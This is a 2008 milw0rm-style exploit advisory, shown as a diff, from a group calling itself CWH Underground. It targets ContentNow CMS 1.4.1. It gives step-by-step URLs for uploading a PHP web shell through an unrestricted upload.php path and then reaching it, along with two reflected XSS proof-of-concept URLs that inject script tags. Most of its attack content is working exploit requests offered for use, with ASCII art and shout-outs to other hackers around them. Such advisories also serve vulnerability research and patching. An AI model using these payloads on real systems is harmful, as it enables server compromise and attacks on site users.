@@ -1,0 +1,58 @@
+===============================================================
+  ContentNow CMS (Upload/XSS) Multiple Remote Vulnerabilities
+===============================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 6 July 2008
+SITE   : cwh.citec.us
+
+
+#####################################################
+ APPLICATION : Content CMS
+ VERSION     : 1.4.1
+ VENDOR	     : http://www.contentnow.mf4k.de
+ DOWNLOAD    : http://downloads.sourceforge.net/contentnow/contentNow_141.zip
+#####################################################
+
+--- Arbitrary File Upload ---
+
+	This Vulnerability can upload malicious files direct to web server.
+
+[Login as user]
+
+[+] Upload Path: http://[Target]/[contentNow_path]/upload.php?path=/[contentNow_path]/upload/
+
+    [-] Example: http://192.168.24.25/contentNow/cn/upload.php?path=/contentNow/upload/
+
+[+] Shell Script: http://[Target]/[contentNow_path]/upload/file/[Evil File]
+
+    [-] Example: http://192.168.24.25/contentNow/upload/file/myshell.php
+
+
+--- Remote XSS Exploit ---
+
+-------------
+ POC Exploit
+-------------
+
+[+] http://192.168.24.25/contentnow/upload/file/language_menu.php/>"><script>alert("XSS")</script>
+[+] http://192.168.24.25/contentnow/upload/file/language_menu.php?pageid=>"><script>alert("XSS")</script>&clang=en
+
+##################################################################
+  Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  
+##################################################################
+
+# milw0rm.com [2008-07-06]
